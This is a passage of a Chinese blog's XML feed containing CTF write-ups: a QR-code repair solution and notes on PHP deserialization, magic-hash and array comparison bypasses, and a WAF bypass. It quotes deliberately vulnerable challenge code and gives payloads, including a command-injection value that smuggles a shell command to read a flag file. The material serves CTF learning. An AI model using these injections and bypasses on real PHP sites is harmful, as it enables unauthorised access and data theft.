    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="14d78877d0d27c636803c9db7e7a3ad156b27454a96fa0f07e031d6c155cb25c"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">为菈妮，我变成狼人模样</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <categories>
      
      <category>随记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>随记</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>二维码补全</title>
    <link href="/2022/01/13/%E4%BA%8C%E7%BB%B4%E7%A0%81%E8%A1%A5%E5%85%A8/"/>
    <url>/2022/01/13/%E4%BA%8C%E7%BB%B4%E7%A0%81%E8%A1%A5%E5%85%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>直接上总结: 二维码右半部分是数据区(存储数据)，左半部分是校验区(验证扫到的二维码有没有缺漏啥的)，左上、左下、右下左上的那几个大小方块叫做定位块(顾名思义就是用来定位二维码的)</p><p>根据上面这段话阔以得出以下结论:<br>1、有了右半部分就相当于有了全部数据<br>2、在右半部分和左半部分都有一定缺失的情况下，若缺失在一定比例，则仍可以获得信息 (这是根据1个叫里德-所罗门的纠错算法实现的，涉及数学并8需要理解)<br>3、在缺失定位块导致无法扫描二维码的情况下，只要把定位块补全就可以了(最简单的，电脑里的画图程序就阔以做到这点)</p><p>这里推荐一个链接，<a href="https://h3110w0r1d.com/qrazybox/">qrazybox</a>，可以在线进行手撕，点击tools-&gt;强制解码的选项，就阔以提取二维码里的信息啦</p><h1 id="前置知识，关于二维码"><a href="#前置知识，关于二维码" class="headerlink" title="前置知识，关于二维码"></a>前置知识，关于二维码</h1><p>二维码补全也算misc的1个题型，最近摆烂打ctf做了一个有手就行的题，8过还是花了将近半个白天，而反观一块打的梁佬，只靠网上找相关资料和阅读官方源文档就还原出了二维码，只能说自己的学习能力有待提高</p><p>在做的时候，bbs里的1个wp帮忙少绕了很多弯，但也有些8好的地方，就是….这位大佬是纯手撕的，也就是把二维码的像素写在纸上然后手动根据掩码进行异或，这……只能说tql，真的头铁，于是俺一开始也陷入误区，<del>拿出纸笔</del>准备手撕来着</p><p>然后才知道在用对了工具后，这题可以有多简单</p><p>首先了解一下二维码的组成<br><img src="/images/%E6%8A%97%E7%96%ABctf/misc(5).jpeg"></p><p>可以看到，二维码的右半部分是数据块(data)，而左半部分是校验块(error_correction)，因此有了右半部分就等于有了全部信息，所以这道misc并不算撕二维码中的难题，只要把右半部分翻译就行了，但还是做了很久，因为当时头铁，抄在了纸上直接异或手撕，根本没想过网上有没有工具可以利用，只能说智商堪忧。</p><p>另外，标红的地方记录着二维码的样式信息，本题只能看到右上角的部分，但这就够了</p><h1 id="一道简单例题的wp"><a href="#一道简单例题的wp" class="headerlink" title="一道简单例题的wp"></a>一道简单例题的wp</h1><p>下载文件，发现是个只有半截的二维码<br><img src="/images/%E6%8A%97%E7%96%ABctf/misc(3).jpg"></p><p>然后回到这道题，根据半截二维码可读出右上方部分的样式信息，即format的后8位，为: 11010000，根据这个阔以确定掩码类型，由下图可知，为:H3<br><img src="/images/%E6%8A%97%E7%96%ABctf/misc(6).jpeg"><br>其中H代表纠错级别，为30%(即可还原30%损坏的数据块), 而3则代表掩码图案，如下图。至于掩码图案有啥用，上面的链接有写<br><img src="/images/%E6%8A%97%E7%96%ABctf/misc(7).jpeg"></p><p>于是在确定了掩码类型后，就阔以撕了!<br>先在上面说过的在线撕二维码的网站里把二维码都填进去<br><img src="/images/%E6%8A%97%E7%96%ABctf/misc(4).png"></p><p>然后，根据确定的掩码图案类型，选中Tools-&gt;Data Masking(掩码异或)-&gt;对应的掩码类型(此处为3)，进行异或</p><p><img src="/images/%E6%8A%97%E7%96%ABctf/misc(8).png"></p><p>然后再选择Tools-&gt;Extract QR Information(强制解码)，然后就出flag了……没错，就这么简单<br><img src="/images/%E6%8A%97%E7%96%ABctf/misc(9).png"></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>基础</category>
      
    </categories>
    
    
    <tags>
      
      <tag>misc</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>php反序列化姿势学习&amp;一些绕过</title>
    <link href="/2022/01/11/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%A7%BF%E5%8A%BF%E5%AD%A6%E4%B9%A0/"/>
    <url>/2022/01/11/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%A7%BF%E5%8A%BF%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<p>反序列化漏洞，web入门基础之一,记录了一些姿势和绕过</p><p>php反序列化漏洞的原理，俺觉得这篇文章讲的8错，适合php0基础小白: <a href="https://blog.csdn.net/weixin_42751456/article/details/88758908">链接</a><br>总结:<br>unserialize漏洞依赖几个条件：<br>unserialize函数的参数可控<br>脚本中存在一个构造函数（__construct()）、析构函数（__destruct()）、__wakeup()函数中有向php文件中写数据的操作的类<br>所写的内容需要有对象中的成员变量的值</p><h1 id="一些绕过"><a href="#一些绕过" class="headerlink" title="一些绕过"></a>一些绕过</h1><h2 id="is-numeric-绕过"><a href="#is-numeric-绕过" class="headerlink" title="is_numeric()绕过"></a>is_numeric()绕过</h2><p>利用数组绕过: 大部分php不会判断数组</p><h2 id="强等于、弱等于绕过"><a href="#强等于、弱等于绕过" class="headerlink" title="强等于、弱等于绕过"></a>强等于、弱等于绕过</h2><p>弱等于判断的时候，如果两边的类型不同，则先是将类型转换成相同的，再进行比较<br>强等于判断的时候，先判断类型是否一样，不一样直接false，一样才比较</p><p>弱等于的转换:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-string">&quot;admin&quot;</span>==<span class="hljs-number">0</span>;<span class="hljs-comment">//true</span><br><span class="hljs-string">&quot;1admin&quot;</span>=<span class="hljs-number">1</span>;<span class="hljs-comment">//true</span><br><span class="hljs-string">&quot;3%00&quot;</span>=<span class="hljs-number">3</span>;<span class="hljs-comment">//true</span><br></code></pre></td></tr></table></figure><p>以及:<br>&#x3D;&#x3D;对于所有0e开头的都为相等<br>进行比较运算时，如果遇到了0e\d+这种字符串，就会将这种字符串解析为科学计数法</p><h2 id="关键词屏蔽绕过"><a href="#关键词屏蔽绕过" class="headerlink" title="关键词屏蔽绕过"></a>关键词屏蔽绕过</h2><p>变量覆盖:<br>eg: flag为屏蔽词，且贪婪匹配<br>?ip&#x3D;127.0.0.1;a&#x3D;g;cat$IFS$1fla$a.php有flag<br>?ip&#x3D;127.0.0.1;b&#x3D;ag;a&#x3D;fl;cat$IFS$1$a$b.php 有flag</p><h2 id="md5绕过"><a href="#md5绕过" class="headerlink" title="md5绕过"></a>md5绕过</h2><p>0e绕过<br>处理hash字符串时，PHP会将每一个以 0E开头的哈希值解释为0，那么只要传入的不同字符串经过哈希以后是以 0E开头的，那么PHP会认为它们相同</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$a</span> = <span class="hljs-string">&quot;s878926199a&quot;</span>;<br><span class="hljs-variable">$b</span> = <span class="hljs-string">&quot;s155964671a&quot;</span>;<br><span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$a</span>) == <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$b</span>);<span class="hljs-comment">//true</span><br><span class="hljs-variable">$a1</span> = <span class="hljs-string">&quot;0e33&quot;</span>;<br><span class="hljs-variable">$b1</span> = <span class="hljs-string">&quot;0e89&quot;</span>;<br><span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$a1</span>)=<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$b1</span>);<span class="hljs-comment">//true</span><br></code></pre></td></tr></table></figure><p>数组绕过<br>在 PHP5 和 PHP7 中，当两个 md5 进行比较时，若参数是不同的数组，那么 &#x3D;&#x3D; 和 &#x3D;&#x3D;&#x3D; 比较的结果均为 True</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$a</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;a&quot;</span>];<br><span class="hljs-variable">$b</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;b&quot;</span>];<br><span class="hljs-comment">//输入?a[]=1&amp;b[]=2</span><br><span class="hljs-variable">$a</span>===<span class="hljs-variable">$b</span>;<span class="hljs-comment">//true</span><br></code></pre></td></tr></table></figure><p>md5碰撞<br>需要用到1个叫fastcoll.exe的软件，这个软件的功能有点牛逼，可以输入1一个a软件(也可以是.txt)，然后输出b和c软件，b和c的名字8同，但md5值是相同的</p><h2 id="php弱-强类型比较-一些作业"><a href="#php弱-强类型比较-一些作业" class="headerlink" title="php弱\强类型比较 &amp;&amp; 一些作业"></a>php弱\强类型比较 &amp;&amp; 一些作业</h2><p>感觉像是只会出现在ctf里的绕过…</p><p>成因:<br>&#x3D;&#x3D; 在进行比较的时候，会先将两边的变量类型转化成相同的，再进行比较<br>0e在比较的时候会将其视作为科学计数法，所以无论0e后面是什么，0的多少次方还是0。<br>因此CTF比赛中需要用到弱类型HASH比较缺陷最明显的标志便是管理员密码MD5之后的值是以0e开头</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs smali">ej0D<br>ek06<br>el08<br>eo0n<br>ey0M<br>ey0O<br>ez0s<br>e006<br>e10l<br>eU3Z<br>eW3vfSoL<br>fToh<br>fTo1<br>fUoU<br>fYou<br>fapF<br>fbpf<br>fdpF<br>fnpZ<br>fppr<br>fqpa<br>frpj<br>fwpD<br>fyp5<br>f1p2<br>f4pN<br>f7pu<br>fDpQ<br>fHpP<br>fIp4<br>fJpX<br>fLpv<br>fOpi<br>fQp3<br>fTpi<br>fVpz<br>feqN<br>fjqN<br>fvq1<br>fyqy<br>fAqJ<br>fEqk<br>fFqg<br>fFqi<br>fHqX<br>fIqF<br>fKqh<br>fLq6<br>fQq6<br>fQqA<br>fRql<br>fUq4<br>fUqA<br>fXq0<br>farg<br>farJ<br>ftrT<br>f7rm<br>fCrB<br>fErY<br>fIrt<br>QNKCDZO<br>s878926199a<br>s155964671a<br>s214587387a<br>s214587387a<br>s878926199a<br></code></pre></td></tr></table></figure><p>至于强类型&#x3D;&#x3D;&#x3D;，则阔以通过数组绕过(数组返回NULL)，比如要求$param1!&#x3D;&#x3D;$param2，但md5($param1)&#x3D;&#x3D;&#x3D;md5($param2):</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">param1</span>[]=<span class="hljs-number">1</span>&amp;param2[]=<span class="hljs-number">2</span><br></code></pre></td></tr></table></figure><p>传数组的方法也可以用来绕过sha1()等hash加密函数相关的判断，也可以绕过正则判断，可以说值得记忆</p><h1 id="各种姿势"><a href="#各种姿势" class="headerlink" title="各种姿势"></a>各种姿势</h1><h2 id="反序列化逃逸"><a href="#反序列化逃逸" class="headerlink" title="反序列化逃逸"></a>反序列化逃逸</h2><p>这是学完反序列化漏洞后做的第1个题，不算真正的反序列化漏洞题，利用了unserialize函数的1个特性<br>进入网页，php源码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>);   <span class="hljs-comment">//flag.php!!!!!!!!!</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">replace</span>(<span class="hljs-params"><span class="hljs-variable">$payload</span></span>)</span>&#123;<br>    <span class="hljs-variable">$filter</span>=<span class="hljs-string">&quot;/flag/i&quot;</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-variable">$filter</span>,<span class="hljs-string">&quot;nono!&quot;</span>,<span class="hljs-variable">$payload</span>); <span class="hljs-comment">//匹配payload中的filter并替换，此处的/i表示大小写不敏感，(在菜鸟在线里验证过，单双引号的区别</span><br>&#125;;<br><span class="hljs-variable">$sss</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ky&#x27;</span>];  <span class="hljs-comment">//单引号，不转义, 此处为用户输入的可构造payload部分</span><br><span class="hljs-variable">$ctf</span>[<span class="hljs-string">&#x27;sss1&#x27;</span>]=<span class="hljs-string">&#x27;webwebweb&#x27;</span>;<br><span class="hljs-variable">$ctf</span>[<span class="hljs-string">&#x27;sss2&#x27;</span>]=<span class="hljs-string">&#x27;pwnpwnpwn&#x27;</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$sss</span>))&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$sss</span>,<span class="hljs-string">&#x27;flag&#x27;</span>)&gt;=<span class="hljs-number">0</span>)&#123;<span class="hljs-comment">//返回flag在php中第一次出现位置的数字 若没有则返回FALSE，所以必须出现上述</span><br>        <span class="hljs-variable">$ctf</span>[<span class="hljs-string">&#x27;sss1&#x27;</span>]=<span class="hljs-variable">$sss</span>;  <span class="hljs-comment">//ss1换成payload</span><br>        <span class="hljs-variable">$ctf</span>=<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-title function_ invoke__">replace</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$ctf</span>)));<span class="hljs-comment">//serialize:序列化一个对象或数组，返回字符串；调用replace，把&quot;/flag/i&quot;换成nono!，可以双写绕过</span><br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$ctf</span>[<span class="hljs-string">&#x27;sss2&#x27;</span>]===<span class="hljs-string">&quot;webwebweb&quot;</span>)&#123;   <span class="hljs-comment">//3个=，强比较，没法绕</span><br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;nonono!&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>还算简单，俺这个没学过php的勉强能看懂，那么怎么构造呢?当时半天没想出来，后来kill7imer师傅花了20min就做出来了，是俺太笨了呜呜呜<br>payload:<br>    flagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflag”;s:4:”sss2”;s:9:”webwebweb”;}</p><p>大致原理</p><p>在unserialize反序列化时，若参数字符串不符合序列化的标准格式(比如数字和实际字符长度不匹配)，那么反序列化失败，unserialize啥也8会返回，因此此处要输入很多’flag’确保被替换成’nono!’后也满足序列化格式</p><p>然后后面的咋解决呢? 8用解决，因为unserialize在操作完后就8会管后面的字符串，因此闭合、填充就可以了，这就叫反序列化逃逸</p><h2 id="各种魔术方法在什么时候被调用"><a href="#各种魔术方法在什么时候被调用" class="headerlink" title="各种魔术方法在什么时候被调用"></a>各种魔术方法在什么时候被调用</h2><p>__construct: 对象被创建(实例化)时被调用<br>__set: 出现异常时调用(比如访问1个8存在的属性)，用于将数据写入不可访问的属性<br>__sleep: 在对象被序列化时被调用(先__sleep，然后serialize)<br>__wakeup: 在对象被反序列化时被调用(先__wakeup，然后unserialize)<br>__destruct: 在对象被销毁时被调用(可以利用之删除某些文件)(4nd绝大部分情况下php会自动删除对象，也就是这个函数一般一定会被调用)</p><p>__toString 当一个对象被当作字符串使用时被调用, 返回值需为字符串(eg: echo $obj)<br>__call() 在对象上下文中调用不可访问的方法时触发<br>__callStatic() 在静态上下文中调用不可访问的方法时触发<br>__get() 用于从不可访问的属性读取数据&#x2F;&#x2F;调用私有属性时使用<br>__isset() 在不可访问的属性上调用isset()或empty()触发<br>__unset() 在不可访问的属性上使用unset()时触发<br>__invoke() 当脚本尝试将对象调用为函数时触发</p><h2 id="改变属性数绕过-wakeup"><a href="#改变属性数绕过-wakeup" class="headerlink" title="改变属性数绕过__wakeup"></a>改变属性数绕过__wakeup</h2><p>原理: 当序列化字符串中表示对象属性个数的数字值大于真实类中属性的个数时就会跳过__wakeup的执行</p><h2 id="tips"><a href="#tips" class="headerlink" title="tips"></a>tips</h2><p>如果类中含有protect或者private变量，那么里面可能会有空字符，在复制时无法复制进去，于是需要我们在burp抓包后手动用”%00”填充<br>比如:<br><img src="/images/%E5%88%B7%E9%A2%98/buuctf(3).png"></p><p>php的版本不同，可能会导致反序列化的结果也不同</p><h1 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h1><h2 id="php-极客大挑战2019-反序化之跳过-wakeup执行"><a href="#php-极客大挑战2019-反序化之跳过-wakeup执行" class="headerlink" title="php 极客大挑战2019 (反序化之跳过__wakeup执行)"></a>php 极客大挑战2019 (反序化之跳过__wakeup执行)</h2><p>操了，忘了网站的备份文件这个知识点: <a href="http://www.zip是网站的备份文件/">www.zip是网站的备份文件</a></p><p>通过这题再学习一下php反序列化漏洞<br>然后根据提示，下载<a href="http://www.zip文件,查看class.php(这里有个dirsearch的扫网站后台目录脚本阔以用一手)/">www.zip文件，查看class.php(这里有个dirsearch的扫网站后台目录脚本阔以用一手)</a>: </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;flag.php&#x27;</span>;<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Name</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$username</span> = <span class="hljs-string">&#x27;nonono&#x27;</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$password</span> = <span class="hljs-string">&#x27;yesyes&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$username</span>,<span class="hljs-variable">$password</span></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;username = <span class="hljs-variable">$username</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;password = <span class="hljs-variable">$password</span>;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;username = <span class="hljs-string">&#x27;guest&#x27;</span>;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;password != <span class="hljs-number">100</span>) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;&quot;</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;You name is: &quot;</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;username;<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/br&gt;&quot;</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;You password is: &quot;</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;password;<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/br&gt;&quot;</span>;<br>            <span class="hljs-keyword">die</span>();<br>        &#125;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;username === <span class="hljs-string">&#x27;admin&#x27;</span>) &#123;<br>            <span class="hljs-keyword">global</span> <span class="hljs-variable">$flag</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can&#x27;t give you the flag!&quot;</span>;<br>            <span class="hljs-keyword">die</span>();<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>然后在index.php中有一段php代码，第一次看没看到…</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;class.php&#x27;</span>;<br>    <span class="hljs-variable">$select</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;select&#x27;</span>];<br>    <span class="hljs-variable">$res</span>=<span class="hljs-title function_ invoke__">unserialize</span>(@<span class="hljs-variable">$select</span>);<br>    <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>然后就阔以大致推测，get传过去的select经反序列化变成的res会被传到class.php中作为$this</p><p>做法: 要调用__destruct函数才能显示flag，幸运的是php一般会主动调用这个函数，8需要我们调用<br>然后password要弱等于100，username要等于’admin’，这就有问题了，因为在反序列化时会调用__wake函数，而__wake函数会把username改了</p><p>所以就需要绕过这个函数，怎么绕呢? 可以通过改变属性数绕过，原理是: 当序列化字符串中表示对象属性个数的数字值大于真实类中属性的个数时就会跳过__wakeup的执行</p><p>所以我们构造payload: O:4:”Name”:3:{s:14:”%00Name%00username”;s:5:”admin”;s:14:”%00Name%00password”;i:100;}<br>注意: 此处的%00是空字符，原因是$password和$username都是私有变量，因此在序列化时就会是这种格式</p><h2 id="easy-calc-php字符串解析特性绕过WAF，附解析替换作业"><a href="#easy-calc-php字符串解析特性绕过WAF，附解析替换作业" class="headerlink" title="easy calc (php字符串解析特性绕过WAF，附解析替换作业)"></a>easy calc (php字符串解析特性绕过WAF，附解析替换作业)</h2><p>这题考察waf绕过和php字符串解析特性绕过</p><p>随便输入个’1+!’，返回: “&gt;You don’t have permission to access &#x2F;calc.php on this server.”<br>于是就没去访问calc.php，但其实是我误解了，没法访问是因为输入了字母，而如果提交的参数合法的话是阔以访问的…</p><p>然后偷瞄wp，回来访问calc.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>]))&#123;<br>    <span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-variable">$str</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>];<br>        <span class="hljs-variable">$blacklist</span> = [<span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-string">&#x27;\t&#x27;</span>, <span class="hljs-string">&#x27;\r&#x27;</span>, <span class="hljs-string">&#x27;\n&#x27;</span>,<span class="hljs-string">&#x27;\&#x27;&#x27;</span>, <span class="hljs-string">&#x27;&quot;&#x27;</span>, <span class="hljs-string">&#x27;`&#x27;</span>, <span class="hljs-string">&#x27;\[&#x27;</span>, <span class="hljs-string">&#x27;\]&#x27;</span>,<span class="hljs-string">&#x27;\$&#x27;</span>,<span class="hljs-string">&#x27;\\&#x27;</span>,<span class="hljs-string">&#x27;\^&#x27;</span>];<br>        <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$blacklist</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$blackitem</span>) &#123;<br>                <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/&#x27;</span> . <span class="hljs-variable">$blackitem</span> . <span class="hljs-string">&#x27;/m&#x27;</span>, <span class="hljs-variable">$str</span>)) &#123;<br>                        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;what are you want to do?&quot;</span>);<br>                &#125;<br>        &#125;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-string">&#x27;echo &#x27;</span>.<span class="hljs-variable">$str</span>.<span class="hljs-string">&#x27;;&#x27;</span>);<span class="hljs-comment">//执行 &#x27;echo $str;&#x27;语句</span><br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>黑名单限制，有戏<br>此处只限制了空格等字符，没有限制字符串，但输入字符串却会返回警告(且警告内容8一样)，说明有waf</p><p>waf限制只能提交数字，字母会被过滤，但是阔以用php字符串解析特性绕过waf</p><h3 id="php字符串解析特性"><a href="#php字符串解析特性" class="headerlink" title="php字符串解析特性"></a>php字符串解析特性</h3><p>php在解析时，需要将所有参数转化为有效变量名，为此它要做2件事: 1、把所有空白字符删除；2、把一些字符转化为下划线(包括空格)<br>为此就阔以提交”&#x2F;? num&#x3D;payload”，此时提交的参数是’ num’，删除空格变为num，就阔以绕过防火墙了<br>然后我试了试，发现失败…原因是要把空格换成%20，然后就提交成功了</p><p>然后构造payload，通过scandir()+var_dump()函数查看目录<br>scandir(pram): 列出参数目录下的所有文件\目录(eg:pram&#x3D;’&#x2F;image&#x2F;‘)</p><p>但是calc.php限制了’&#x2F;‘，怎么办?<br>可见你白学了，这个阔以用chr(47)绕过aaaaaaaaaaaah</p><figure 